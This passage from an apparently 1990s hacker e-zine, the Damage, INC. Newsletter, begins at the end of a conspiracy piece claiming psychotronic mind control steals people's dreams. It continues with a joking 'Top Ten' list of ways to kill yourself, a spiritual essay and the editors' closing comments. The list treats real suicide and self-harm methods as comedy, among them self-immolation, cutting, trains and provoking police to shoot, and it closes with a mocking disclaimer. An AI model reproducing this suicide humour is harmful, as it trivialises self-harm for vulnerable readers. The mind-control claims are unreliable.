thoughts' into peoples heads, not to mention the myriad ways
to torture/"destabilize," thru psychotronic means, during the
waking hours.  There are people in this country who probably
haven't had a dream they can call their own for about 30 years.
The "unthinkable" is now the new reality.

This disclosure doesn't take into account the possible use of
brain implants (the cyborg protocol), subliminal messaging or
entrainment.

Recognition of this technology and the abuses of it is the
first step towards any supposedly 'free people's' taking charge
of  their 'own' destinies--failure to do so is enslavement.
Burying your head in the sand will not make it go away.

THC PHREAK'S TOP TEN LIST -                                       {TOP TEN}
"Ways to kill yourself"

        1.  Jump off of the CN Tower into the SkyDome during a baseball game
            while the roof is open and land near first base.  On the way down,
            drop leaflets that read "Did you see that?"  It's one way to ensure
            that your death is televised and seen by a large crowd of cheering
            people.  It's a real attention grabber too.  The people watching
            will literally be on the edge of their seats.  Maybe they'll even
            do the wave as a tribute to you.  :)  This one is strictly for
            Canadians.

        2.  Stand on railway tracks and wait for a high speed train to approach.
            As it's travelling at 100+ mph, video tape it heading straight at
            you.  Then, to prove that you're fearless, start running at the
            train and right before impact, attempt to shoulder tackle it.  At
            least nobody can say you didn't have guts and call you a coward.
            This one is strictly for Europeans.

        3.  Go to a steel plant.  Dive head first into a container of molten
            steel.  Swim around in it and pretend that it's water.  Show no
            pain as you're body is being incinerated.  This one is for anyone
            that lives close to a steel plant.

        4.  Sit in the middle of a busy intersection and pour gasoline all
            over yourself.  Light a cigarette.  Start smoking it.  Then light
            yourself on fire.  Continue smoking as though nothing is happening.

        5.  Tape bullets, shards of glass, sharp pieces of triangular sheet
            metal, nails etc. to your body.  Then drink nitro glycerin and
            inject it into your veins while standing in a busy subway station.
            Start hopping around.  Do the "human pipe bomb."

        6.  Get some C4 and TNT.  Dress up as Barney.  Attach the explosives
            to your body underneath the suit.  Go hand gliding off a tall
            building in a large city like New York, and detonate the explosives.
            It's called the "Barney Splat."

        7.  Don't sleep for 20 years.  Eventually you'll die.  It's a slow,
            boring death though.  Sit and stare at a computer monitor instead
            of sleeping.  They don't call them "terminals" for nothing.  The
            radiation can be terminal.  This one is for slow people.

        8.  Carve an anarchy symbol into your back using a dull knife.  You
            probably won't bleed to death, but it was fun right?  So what if
            it doesn't kill you.  :)  This one is for sadistic anarchists.

            Or, if you really like this method and want to die, do that while in
            a pit of leeches.  If that fails, swim with some sharks while you're
            bleeding.  You'll feed their frenzy.

        9.  Prescription for death:  Listen to a warez d00d brag about how many
            0 second warez they have.  Repeat daily until death ensues.  It
            should take 4-6 weeks.  Warning:  Very slow and painful.  It will
            seem like 6 years of torture.  This one is for Kevorkianites.

       10.  Walk into a police station holding a gun.  This is the quickest
            death since the trigger happy cops will gladly riddle you with
            bullets (even if it's a gun amnesty day for handing over weapons).
            Of course, you'll have to wait until some of them put their coffee
            cups down, shoot and actually hit their target.  If you want to
            die faster, don't move.  If you move, they'll miss.  Start shooting
            at them and they might get serious.  Then put the gun to your own
            head and pull the trigger to cheat them out of the kill.  :)


Warning:  Don't try any of the methods above and think you're kewl.  This
          disclaimer is here to prevent you from acting foolishly.  If you
          are under 18 then take my word for it, this shit is dangerous.
          So, be sure to get your parent's permission first kiddies.  :)

THOUGHTS, POEMS AND CREATIVE WRITING -                            {WRITING}
Thoughts beyond this Physical World.

Many people believe that when the Apocalypse arrives, it will be the end of
the world.  That is definitely a conceited claim.

The human race is but a shooting star which falls from the sky when compared to
the time our planet has existed.  And the planet Earth will exist long
after we are nothing but dust in the wind.

In the physical world, everything has a lifespan.  Birth, growth, and death
are the constant rules of our existence.

However, there is another dimension to the human race that is not prevalent
in any other terrestrial creature.  We also have intelligence and spirit.

Our intelligence and sentience enables us to learn some of the secrets of the
physical world.  Many humans have dedicated their lives to this pursuit.

Current scientific and technological discoveries are a result of this
overpowering need to master the physical world.  It is unfortunate that
most of our race's wit and wisdom is dedicated to satisfy our primal
instincts.

Meanwhile, has the human spirit evolved and changed in recent history?
In my opinion, many humans have regressed into zombies.

Wouldn't it be beneficial to us all if we could harness the power of our
mind?  Telepathy, telekinesis, astral projection and other abilities could
belong to all of us.

However such abilities would be used by shortsighted people in the
neverending battle to impose their own order upon this physical world.
Those abilities should be developed and used to expand our horizons beyond
what we know, into worlds we haven't yet explored.

This physical world is being abused and exhausted.  If the human race
wants to grow, we must turn our heads and look in a new direction.

CLOSING COMMENTS -                                                {CLOSING}
BLACKENED's Insightful Closing Comments:

As always, we've given you many things to think about... as well as some
usable information and source code.  However, we realize the opinions of
Damage, INC. and that of your own may differ.  If so, that's great.  We
encourage you to write and send in articles or feedback that express what
you think.  Also, if you find an interesting article that's informative and
you want to share it with others, send it to damage_inc@mailcity.com with a
Subject of "Reports from the Front".  We want our readers to become involved
in the process and make valuable contributions.  The more information that we
receive, the better as the quality of the Damage, INC. Newsletter will increase.

In closing, don't shy away from controversy.  Don't be afraid to be outspoken,
especially if your views don't fit into the mainstream.  Expect criticism from
the ignorant, the politically correct, the following zombies and be willing
to face it.  As in, if you're against something then fight it instead of
complaining silently about it.  Indifference and complacency are two very
destructive states of mind since they can harm you unexpectedly.  Laziness is
also one of the worst wastes of knowledge and ideas.  Doing nothing can come
back to haunt you if you just sit back and watch things happen that you don't
agree with.  Sitting at a terminal... staring blankly at a monitor for hours
accomplishes nothing.  It can actually "dumb you down".  Just as, discussing
topics of importance to you with your friends won't change anything... no matter
how logical and relevant you think your points are.  In order to make a real
difference, it requires work.  For example, revolutionaries aren't made in a
day.  Nor are leaders, freedom fighters and terrorists recognized overnight.
It takes more than strong beliefs, time and dedication.  Basically, you need
perseverance and a strong willingness to continually learn new ways to use
information and fight for what you believe in.  Whether it's censorship,
corruption or "society" that you're fighting against, you need information.
That may sound cheesy, like an old cliche... but it's true.  Afterall, isn't
truth what everyone is seeking?
